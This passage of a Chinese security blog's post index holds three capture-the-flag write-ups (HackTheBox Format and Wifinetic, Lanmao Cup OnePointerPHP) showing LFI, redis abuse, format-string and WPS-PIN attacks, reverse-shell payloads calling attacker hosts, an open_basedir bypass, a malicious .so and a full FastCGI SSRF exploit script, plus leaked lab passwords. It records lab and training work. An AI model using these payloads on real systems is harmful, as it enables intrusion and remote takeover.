Over！","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Format","slug":"HTB20-Format-Medium","date":"2023-10-06T11:00:00.000Z","updated":"2023-11-06T10:05:13.765Z","comments":true,"path":"posts/ec5f74de.html","link":"","permalink":"https://wa0er.github.io/posts/ec5f74de.html","excerpt":"","text":"HTB-Format一、思路概要1.信息收集主页超链接找到源码； 2.源码审计本地文件包含+redis未授权； 3.redis未授权垂直越权； 4.本地文件包含配合源码漏洞写反弹shell； 5.sudo -l发现敏感文件； 6.python格式化字符串漏洞获取root权限。 二、信息收集端口服务扫描 有一个域名microblog.htb和非常规端口3000 80端口开放，那么直接访问IP发现会自动跳转到http://app.microblog.htb/ 那就把两个域名添加进本地hosts文件 echo \"10.10.11.213 microblog.htb app.microblog.htb\" &gt;&gt; /etc/hosts 访问microblog.htb是404，访问app.microblog.htb如下图 有登录和注册功能点，底部有超链接 点击Contribute here超链接，跳转到如下图界面，是源码 注册个test用户，然后会自动登录，新建一个Blog 新建成功后，点击Edit Site，会自动跳转到http://test.microblog.htb/edit/，所以需要把test.microblog.htb添加进本地hosts文件 echo \"10.10.11.213 test.microblog.htb\" &gt;&gt; /etc/hosts 添加好后，再次点击Edit Site，会跳转到如下图界面 h1和txt是两个设置选项，可以设置header和txt，抓包可看到POST传参分别是id=c0mdsvzdfum&amp;header=headertest、id=jyjs1v121x&amp;txt=txttest 三、LFI（本地文件包含漏洞）看源码microblog-template\\edit\\index.php发现id存在本地文件包含（LFI）漏洞，对POST参数没有丝毫过滤 POST传参id=../../../../../../../../../../etc/passwd&amp;header=headertest，如下图实现LFI 再看代码，如果isPro条件为True，即用户身份是Pro，那么我们可以上传文件。于是想办法把用户变成pro权限 四、redis未授权源码中多处出现$redis-&gt;connect('/var/run/redis/redis.sock'); 可以用redis未授权，通过redis socket（unix:/var/run/redis/redis.sock），设置test用户的pro为true https://redis.io/commands/hset/ curl -X HSET \"http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:test%20pro%20true%20a/b\" 执行之后，可看到用户已变成pro权限 然后如下命令写反弹shell id=/var/www/microblog/test/uploads/rev.php&amp;header=&lt;%3fphp+echo+shell_exec(\"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.14.9+9898+&gt;/tmp/f\")%3b%3f&gt; 开启监听 然后访问http://test.microblog.htb/uploads/rev.php 成功获取www-data用户权限 依次执行如下命令，找到信息泄露 redis-cli -s /run/redis/redis.sock keys * hgetall cooper.dooper 然后ssh尝试连接，实际用户名密码如下 cooper:zooperdoopercooper 执行sudo -l，查看可以以root身份执行的命令 /usr/bin/license内容如下 #!/usr/bin/python3 import base64 from cryptography.hazmat.backends import default_backend from cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC from cryptography.fernet import Fernet import random import string from datetime import date import redis import argparse import os import sys class License(): def __init__(self): chars = string.ascii_letters + string.digits + string.punctuation self.license = ''.join(random.choice(chars) for i in range(40)) self.created = date.today() if os.geteuid() != 0: print(\"\") print(\"Microblog license key manager can only be run as root\") print(\"\") sys.exit() parser = argparse.ArgumentParser(description='Microblog license key manager') group = parser.add_mutually_exclusive_group(required=True) group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username') group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username') group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key') args = parser.parse_args() r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock') secret = [line.strip() for line in open(\"/root/license/secret\")][0] secret_encoded = secret.encode() salt = b'microblogsalt123' kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend()) encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded)) f = Fernet(encryption_key) l = License() #provision if(args.provision): user_profile = r.hgetall(args.provision) if not user_profile: print(\"\") print(\"User does not exist. Please provide valid username.\") print(\"\") sys.exit() existing_keys = open(\"/root/license/keys\", \"r\") all_keys = existing_keys.readlines() for user_key in all_keys: if(user_key.split(\":\")[0] == args.provision): print(\"\") print(\"License key has already been provisioned for this user\") print(\"\") sys.exit() prefix = \"microblog\" username = r.hget(args.provision, \"username\").decode() firstlast = r.hget(args.provision, \"first-name\").decode() + r.hget(args.provision, \"last-name\").decode() license_key = (prefix + username + \"{license.license}\" + firstlast).format(license=l) print(\"\") print(\"Plaintext license key:\") print(\"------------------------------------------------------\") print(license_key) print(\"\") license_key_encoded = license_key.encode() license_key_encrypted = f.encrypt(license_key_encoded) print(\"Encrypted license key (distribute to customer):\") print(\"------------------------------------------------------\") print(license_key_encrypted.decode()) print(\"\") with open(\"/root/license/keys\", \"a\") as license_keys_file: license_keys_file.write(args.provision + \":\" + license_key_encrypted.decode() + \"\\n\") #deprovision if(args.deprovision): print(\"\") print(\"License key deprovisioning coming soon\") print(\"\") sys.exit() #check if(args.check): print(\"\") try: license_key_decrypted = f.decrypt(args.check.encode()) print(\"License key valid! Decrypted value:\") print(\"------------------------------------------------------\") print(license_key_decrypted.decode()) except: print(\"License key invalid\") print(\"\") 五、python格式化字符串漏洞python格式化字符串漏洞 https://podalirius.net/en/articles/python-format-string-vulnerabilities/ 连接redis redis-cli -s /run/redis/redis.sock 然后执行如下命令，以明文形式获取口令 HMSET test first-name \"{license.__init__.__globals__[secret_encoded]}\" last-name test username test 执行如下命令 sudo /usr/bin/license -p test 口令如下 unCR4ckaBL3Pa$$w0rd 成功获取root权限 Over！","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Wifinetic","slug":"HTB19-Wifinetic-Easy","date":"2023-09-30T11:00:00.000Z","updated":"2023-11-06T10:03:36.431Z","comments":true,"path":"posts/e48c1386.html","link":"","permalink":"https://wa0er.github.io/posts/e48c1386.html","excerpt":"","text":"HTB-Wifinetic一、思路概要信息泄露、无线网络相关知识 二、信息收集 FTP ftp 10.10.11.247 #会提示This FTP server is anonymous only，所以登录anonymous用户 promot #关闭交互模式，不关的话下载每个文件都会询问 mget * #下载所有文件 MigrateOpenWrt.txt有如下内容，提示Reaver工具可以测试安全问题，这里也可以知道是Wifi环境 ProjectGreatMigration.pdf有邮箱和域名 解压tar压缩包 在./etc/config/wireless找到了一个疑似口令 VeRyUniUqWiFIPasswrd1! 在./etc/passwd发现一个非常规用户 尝试连接ssh服务，成功连接 ssh netadmin@10.10.11.247 三、提权无线网络，最主要的就是弄清楚无线AP（Access Point）是谁 执行ifconfig查看wlan0和wlan1分配了IP，常规AP的IP一般都是192.168.1.1、192.168.0.1，暂且猜测wlan0是AP 查看wpa_supplicant服务状态，最后一行命令可看出wlan1是wifi客户端，排除法基本确定wlan0是AP wpa_supplicant是wifi客户端加密认证工具，和iwconfig不同，支持WEP、WPA、WPA2等完整的加密认证，而iwconfig只能支持WEP认证，与其相对应的AP端的加密认证工具为hostapd systemctl status wpa_supplicant.service 命令解释： /sbin/wpa_supplicant: 这是 wpa_supplicant 工具的可执行文件的路径，它用于处理无线网络连接的认证和协商过程。 -u: 以守护进程（daemon）的方式运行。这意味着 wpa_supplicant 将在后台持续运行，而不是在终端窗口中显示输出。 -s: 生成系统日志（system log）信息，以便跟踪其操作和问题排查。 -c /etc/wpa_supplicant.conf: 指定 wpa_supplicant 使用的配置文件的路径。在这种情况下，配置文件位于 /etc/wpa_supplicant.conf，这是一个常见的位置，用于存储无线网络连接的配置信息。该文件包含了网络的SSID（无线网络名称）和密码等信息。 -i wlan1: 指定要用于无线连接的网络接口的名称。此处网络接口的名称是 wlan1，这通常是无线网卡的名称。 查看hostapd服务状态 systemctl status hostapd.service 命令解释： /usr/sbin/hostapd: 这是 hostapd 工具的可执行文件路径，用于启动无线接入点服务。 -B: 以守护进程（daemon）的方式运行，而不在终端窗口中显示输出。 -P /run/hostapd.pid: 指定 hostapd 进程的 PID（Process ID）文件的位置。PID 文件用于存储 hostapd 进程的进程号，以便后续管理和监控。 /etc/hostapd/hostapd.conf: 指定 hostapd 使用的配置文件的路径。这个文件包含了无线接入点的配置信息，如无线网络的名称（SSID）、加密方式、密码等。 用iwconfig命令查看无线网卡配置信息 iwconfig 命令类似于ifconfig命令，但是它配置对象是无线网卡，它对网络设备进行无线操作，如设置无线通信频段等。 可以看到： mon0网卡模式是Monitor，说明是监控无线网络状态的接口，一般用于调试或者监控。 wlan1网卡模式是Managed，说明是被管理对象（即客户端），连接的AP的ESSID是OpenWrt，还可看到AP的BSSID（MAC地址）。 wlan0网卡模式是Master，说明是管理者（即AP）。 SSID就是手机上搜索到的wifi名字（本质是一串字符）。 BSSID就是无线路由器的MAC地址（本质是一个MAC地址）。举例，一家公司面积比较大，安装了若干台无线接入点（AP或者无线路由器），每台设备的SSID都一样，员工只需要知道一个SSID就可以在无线范围内接入无线网络。BSSID其实就是每台设备的MAC地址。 ESSID是一个抽象概念。上面的例子中，多台设备相同的SSID就统称为ESSID。 用如下命令查看每个接口的链路状态信息 iw dev 可看到wlan0的地址和ssid和上面分析的完全对应，type值也是AP 用如下命令查看程序文件的capabilities属性 getcap -r / 2&gt;/dev/null getcap命令和Linux capabilities：https://www.cnblogs.com/sparkdev/p/11417781.html 用wash工具扫描wlan1和wlan2，看是否启用了WPS认证，发现都没有结果 wash -i wlan2 用reaver工具破解网络WPS PIN reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1 -i mon0: 指定要用于无线监控的网络接口的名称。在这种情况下，指定的接口是 mon0，通常是一个用于监听无线网络流量的监视模式接口。mon0 接口通常是通过 airmon-ng 等工具创建的。 -b 02:00:00:00:00:00: 指定目标无线网络的BSSID（基本服务集标识符）。 -vv: 增加命令的详细度，使其输出更多的调试信息。-v 表示“详细模式”（verbose mode），使用两个 -v 表示更详细的输出。 -c 1: 指定目标无线网络的信道号。此处信道号是 1，表示 reaver 将尝试破解与该信道关联的目标网络的WPS PIN。 成功获取WPA PSK，尝试以root身份登录，成功获取root权限 WhatIsRealAnDWhAtIsNot51121! Over！","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"蓝帽杯2021-OnePointerPHP","slug":"CTF16-蓝帽杯2021-OnePointerPHP","date":"2023-09-26T11:00:00.000Z","updated":"2023-09-26T02:26:08.109Z","comments":true,"path":"posts/48d4210.html","link":"","permalink":"https://wa0er.github.io/posts/48d4210.html","excerpt":"","text":"蓝帽杯2021-OnePointerPHP知识点概要：基础反序列化、PHP数组key溢出、open_basedir绕过、SSRF攻击FPM服务、被动FTP、SUID权限 题目有源码，首页只有一张图 add_api.php &lt;?php include \"user.php\"; if($user=unserialize($_COOKIE[\"data\"])){ $count[++$user-&gt;count]=1; if($count[]=1){ $user-&gt;count+=1; setcookie(\"data\",serialize($user)); }else{ eval($_GET[\"backdoor\"]); } }else{ $user=new User; $user-&gt;count=1; setcookie(\"data\",serialize($user)); } ?&gt; user.php &lt;?php class User{ public $count; } ?&gt; 对于add_api.php，目标是执行第九行eval($_GET[\"backdoor\"]);，但是正常逻辑： 第4行增加 user 对象的 count 属性值，并将自增后的值赋值给 $count 数组中的一个元素。必然会使第5行if条件为true，那么就必然执行不到第9行。（注意第5行if是赋值运算，不是比较运算） PHP数组key溢出此时就是基础的反序列化和数组key溢出的问题 数组key溢出参考：https://two.github.io/2015/09/15/PHP-array-hash-key-overflow/ 可在本地用如下代码测试观察，数组key只有为9223372036854775807时会如下图报错（测试版本为php7.4.3），从而可以使得题目源码中if条件为flase 64位操作系统int型（带符号整型）数据范围是-2的63次方 ~ 2的63次方-1，计算机组成原理 数据表示的知识 &lt;?php $arr[9223372036854775807] = 1; var_dump($arr[] = 1); 所以序列化代码如下（因为data值是从COOKIE获取，所以最后需要url编码） &lt;?php class User{ public $count=9223372036854775806; } $a = new User; echo serialize($a).\"&lt;br&gt;\"; echo urlencode(serialize($a)); //O:4:\"User\":1:{s:5:\"count\";i:9223372036854775806;} //O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D 请求包头部Cookie字段，data值传入序列化数据，同时GET传参如下（此处笔者用Hackbar完成传参） /add_api.php?backdoor=phpinfo(); 接着想用如下代码直接读flag读不到，返回false ?backdoor=var_dump(file_get_contents(\"/flag\")); open_basedir绕过看phpinfo页面，open_basedir设置在/var/www/html open_basedir功能及绕过参考：https://www.cnblogs.com/LLeaves/p/13210005.html 四种思路： 命令执行函数（如system()函数）绕过； 软链接（如symlink()函数）绕过； glob伪协议绕过； 利用ini_set绕过。 但题目phpinfo中过滤了一些函数，如下图 此处利用ini_set绕过，构造如下payload绕过open_basedir列出根目录下的文件（传参时不能有注释） mkdir('wa0er'); chdir('wa0er'); ini_set('open_basedir','..'); chdir('..'); #相当于\"../\" chdir('..'); chdir('..'); chdir('..'); ini_set('open_basedir','/'); var_dump(scandir('./')); 执行成功后，右键查看源码能让结果更加可视化 还是无法直接读flag，可能是当前用户权限不够。查看php.ini如下 mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/usr/local/etc/php/php.ini')); 有个easy_bypass.so，文件名的提示意味就很强，据说预期题解是Pwn这个so然后来获取flag。 其实做到这里也想过绕过disable_functions直接RCE，我们可以通过挂载恶意so的方式来突破disable_function来实现RCE，挂载so的方法有两种： dl()函数挂载（dl被ban）； 直接写入配置文件的extension中。 但是这里好像都不可行，所以只能另寻思路。 查看当前进程完整命令文件/proc/self/cmdline mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/proc/self/cmdline')); 发现string(18) \"php-fpm: pool www\"，题目环境开启了php-fpm服务 在/usr/local/etc/目录下也可以看到php-fpm.conf等文件 然后读配置文件/usr/local/etc/php-fpm.d/www.conf如下图（可以先scandir()获取目录下文件，然后file_get_contents()读文件） php-fpm服务开放在9001端口，用户是www-data SSRF攻击FPM服务我们可以通过SSRF来攻击FPM服务，但是受限于题目phpinfo的disable_functions，我们无法直接SSRF，但是可以利用file_put_contents()的一个特性来实现SSRF： file_put_contents在使用 ftp 协议时，会将 data 的内容上传到 ftp 服务器，由于 ftp 被动模式下，服务器数据通道的地址和端口是可控，我们可以将地址和端口指到127.0.0.1:9001。同时由于 ftp 的特性，不会有任何的多余内容，类似gopher协议，会将data原封不动的发给127.0.0.1:9001，完美符合攻击 fastcgi(FPM) 的要求. 首先编写一个恶意so文件来执行反弹Shell命令： #define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; __attribute__ ((__constructor__)) void preload (void){ system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/[IP]/[PORT] 0&gt;&amp;1'\"); #反弹Shell，修改IP端口为自己vps监听的IP端口 } 编译文件：gcc 1.c -fPIC -shared -o 1.so（把1.c编译为一个浮动地址的共享库文件1.so） 然后上传so文件（修改IP为自己vps地址） /add_api.php?backdoor=mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(copy('http://[IP]/1.so','/var/www/html/1.so')); 接下来就是想办法SSRF打FPM来挂载so文件实现RCE，可以找到一个直接攻击的脚本，注意326行是so文件路径，339行是FPM服务端口 代码参考：https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php &lt;?php /** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. */ /** * Handles communication with a FastCGI application * * @author Pierrick Charron &lt;pierrick@webstart.fr&gt; * @version 1.0 */ class FCGIClient { const VERSION_1 = 1; const BEGIN_REQUEST = 1; const ABORT_REQUEST = 2; const END_REQUEST = 3; const PARAMS = 4; const STDIN = 5; const STDOUT = 6; const STDERR = 7; const DATA = 8; const GET_VALUES = 9; const GET_VALUES_RESULT = 10; const UNKNOWN_TYPE = 11; const MAXTYPE = self::UNKNOWN_TYPE; const RESPONDER = 1; const AUTHORIZER = 2; const FILTER = 3; const REQUEST_COMPLETE = 0; const CANT_MPX_CONN = 1; const OVERLOADED = 2; const UNKNOWN_ROLE = 3; const MAX_CONNS = 'MAX_CONNS'; const MAX_REQS = 'MAX_REQS'; const MPXS_CONNS = 'MPXS_CONNS'; const HEADER_LEN = 8; /** * Socket * @var Resource */ private $_sock = null; /** * Host * @var String */ private $_host = null; /** * Port * @var Integer */ private $_port = null; /** * Keep Alive * @var Boolean */ private $_keepAlive = false; /** * Constructor * * @param String $host Host of the FastCGI application * @param Integer $port Port of the FastCGI application */ public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket { $this-&gt;_host = $host; $this-&gt;_port = $port; } /** * Define whether or not the FastCGI application should keep the connection * alive at the end of a request * * @param Boolean $b true if the connection should stay alive, false otherwise */ public function setKeepAlive($b) { $this-&gt;_keepAlive = (boolean)$b; if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) { fclose($this-&gt;_sock); } } /** * Get the keep alive status * * @return Boolean true if the connection should stay alive, false otherwise */ public function getKeepAlive() { return $this-&gt;_keepAlive; } /** * Create a connection to the FastCGI application */ private function connect() { if (!$this-&gt;_sock) { //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5); $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5); if (!$this-&gt;_sock) { throw new Exception('Unable to connect to FastCGI application'); } } } /** * Build a FastCGI packet * * @param Integer $type Type of the packet * @param String $content Content of the packet * @param Integer $requestId RequestId */ private function buildPacket($type, $content, $requestId = 1) { $clen = strlen($content); return chr(self::VERSION_1) /* version */ . chr($type) /* type */ . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */ . chr($requestId &amp; 0xFF) /* requestIdB0 */ . chr(($clen &gt;&gt; 8 ) &amp; 0xFF) /* contentLengthB1 */ . chr($clen &amp; 0xFF) /* contentLengthB0 */ . chr(0) /* paddingLength */ . chr(0) /* reserved */ . $content; /* content */ } /** * Build an FastCGI Name value pair * * @param String $name Name * @param String $value Value * @return String FastCGI Name value pair */ private function buildNvpair($name, $value) { $nlen = strlen($name); $vlen = strlen($value); if ($nlen &lt; 128) { /* nameLengthB0 */ $nvpair = chr($nlen); } else { /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */ $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF); } if ($vlen &lt; 128) { /* valueLengthB0 */ $nvpair .= chr($vlen); } else { /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */ $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF); } /* nameData &amp; valueData */ return $nvpair . $name . $value; } /** * Read a set of FastCGI Name value pairs * * @param String $data Data containing the set of FastCGI NVPair * @return array of NVPair */ private function readNvpair($data, $length = null) { $array = array(); if ($length === null) { $length = strlen($data); } $p = 0; while ($p != $length) { $nlen = ord($data{$p++}); if ($nlen &gt;= 128) { $nlen = ($nlen &amp; 0x7F &lt;&lt; 24); $nlen |= (ord($data{$p++}) &lt;&lt; 16); $nlen |= (ord($data{$p++}) &lt;&lt; 8); $nlen |= (ord($data{$p++})); } $vlen = ord($data{$p++}); if ($vlen &gt;= 128) { $vlen = ($nlen &amp; 0x7F &lt;&lt; 24); $vlen |= (ord($data{$p++}) &lt;&lt; 16); $vlen |= (ord($data{$p++}) &lt;&lt; 8); $vlen |= (ord($data{$p++})); } $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen); $p += ($nlen + $vlen); } return $array; } /** * Decode a FastCGI Packet * * @param String $data String containing all the packet * @return array */ private function decodePacketHeader($data) { $ret = array(); $ret['version'] = ord($data{0}); $ret['type'] = ord($data{1}); $ret['requestId'] = (ord($data{2}) &lt;&lt; 8) + ord($data{3}); $ret['contentLength'] = (ord($data{4}) &lt;&lt; 8) + ord($data{5}); $ret['paddingLength'] = ord($data{6}); $ret['reserved'] = ord($data{7}); return $ret; } /** * Read a FastCGI Packet * * @return array */ private function readPacket() { if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) { $resp = $this-&gt;decodePacketHeader($packet); $resp['content'] = ''; if ($resp['contentLength']) { $len = $resp['contentLength']; while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) { $len -= strlen($buf); $resp['content'] .= $buf; } } if ($resp['paddingLength']) { $buf=fread($this-&gt;_sock, $resp['paddingLength']); } return $resp; } else { return false; } } /** * Get Informations on the FastCGI application * * @param array $requestedInfo information to retrieve * @return array */ public function getValues(array $requestedInfo) { $this-&gt;connect(); $request = ''; foreach ($requestedInfo as $info) { $request .= $this-&gt;buildNvpair($info, ''); } fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0)); $resp = $this-&gt;readPacket(); if ($resp['type'] == self::GET_VALUES_RESULT) { return $this-&gt;readNvpair($resp['content'], $resp['length']); } else { throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT'); } } /** * Execute a request to the FastCGI application * * @param array $params Array of parameters * @param String $stdin Content * @return String */ public function request(array $params, $stdin) { $response = ''; // $this-&gt;connect(); $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5)); $paramsRequest = ''; foreach ($params as $key =&gt; $value) { $paramsRequest .= $this-&gt;buildNvpair($key, $value); } if ($paramsRequest) { $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest); } $request .= $this-&gt;buildPacket(self::PARAMS, ''); if ($stdin) { $request .= $this-&gt;buildPacket(self::STDIN, $stdin); } $request .= $this-&gt;buildPacket(self::STDIN, ''); echo('data='.urlencode($request)); # 输出payload // fwrite($this-&gt;_sock, $request); // do { // $resp = $this-&gt;readPacket(); // if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) { // $response .= $resp['content']; // } // } while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST); // var_dump($resp); // if (!is_array($resp)) { // throw new Exception('Bad request'); // } // switch (ord($resp['content']{4})) { // case self::CANT_MPX_CONN: // throw new Exception('This app can\\'t multiplex [CANT_MPX_CONN]'); // break; // case self::OVERLOADED: // throw new Exception('New request rejected; too busy [OVERLOADED]'); // break; // case self::UNKNOWN_ROLE: // throw new Exception('Role value not known [UNKNOWN_ROLE]'); // break; // case self::REQUEST_COMPLETE: // return $response; // } } } ?&gt; &lt;?php // real exploit start here //if (!isset($_REQUEST['cmd'])) { // die(\"Check your input\\n\"); //} //if (!isset($_REQUEST['filepath'])) { // $filepath = __FILE__; //}else{ // $filepath = $_REQUEST['filepath']; //} $filepath = \"/var/www/html/add_api.php\"; $req = '/'.basename($filepath); $uri = $req .'?'.'command=whoami'; $client = new FCGIClient(\"unix:///var/run/php-fpm.sock\", -1); $code = \"&lt;?php system(\\$_REQUEST['command']); phpinfo(); ?&gt;\"; $php_value = \"unserialize_callback_func = system\\nextension_dir = /var/www/html\\nextension = 1.so\\ndisable_classes = \\ndisable_functions = \\nallow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = \"; //修改这里的so文件名称和路径 $params = array( 'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0', 'REQUEST_METHOD' =&gt; 'POST', 'SCRIPT_FILENAME' =&gt; $filepath, 'SCRIPT_NAME' =&gt; $req, 'QUERY_STRING' =&gt; 'command=whoami', 'REQUEST_URI' =&gt; $uri, 'DOCUMENT_URI' =&gt; $req, #'DOCUMENT_ROOT' =&gt; '/', 'PHP_VALUE' =&gt; $php_value, 'SERVER_SOFTWARE' =&gt; '80sec/wofeiwo', 'REMOTE_ADDR' =&gt; '127.0.0.1', 'REMOTE_PORT' =&gt; '9001', // 注意这里的FPM端口 'SERVER_ADDR' =&gt; '127.0.0.1', 'SERVER_PORT' =&gt; '80', 'SERVER_NAME' =&gt; 'localhost', 'SERVER_PROTOCOL' =&gt; 'HTTP/1.1', 'CONTENT_LENGTH' =&gt; strlen($code) ); // print_r($_REQUEST); // print_r($params); //echo \"Call: $uri\\n\\n\"; echo $client-&gt;request($params, $code).\"\\n\"; ?&gt; 将上面代码保存为exploit.php，写入网站/var/www/html/目录，也可以用file_put_contents，IP修改为自己vps地址 /add_api.php?backdoor=mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(copy('http://[IP]/exploit.php','/var/www/html/exploit.php')); 然后访问/exploit.php，得到payload（这里也可以本地运行生成payload，PHP版本对应好就行） data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02B%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B6PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+1.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00 然后在VPS开启FTP服务 import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('0.0.0.0', 9999)) s.listen(1) conn, addr = s.accept() conn.send(b'220 welcome\\n') #Service ready for new user. #Client send anonymous username #USER anonymous conn.send(b'331 Please specify the password.\\n') #User name okay, need password. #Client send anonymous password. #PASS anonymous conn.send(b'230 Login successful.\\n') #User logged in, proceed. Logged out if appropriate. #TYPE I conn.send(b'200 Switching to Binary mode.\\n') #Size / conn.send(b'550 Could not get the file size.\\n') #EPSV (1) conn.send(b'150 ok\\n') #PASV conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\\n') #注意打到9001端口 conn.send(b'150 Permission denied.\\n') #QUIT conn.send(b'221 Goodbye.\\n') conn.close() 拼接payload如下，IP修改为自己vps地址，开启监听nc -lvnp 9898（这里监听端口和.so文件反弹shell的端口对应），然后执行payload /add_api.php?backdoor=phpinfo();file_put_contents($_GET[%27file%27],$_GET[%27data%27]);&amp;file=ftp://test@[IP]:9999/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02B%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B6PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+1.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00 获取到www-data权限 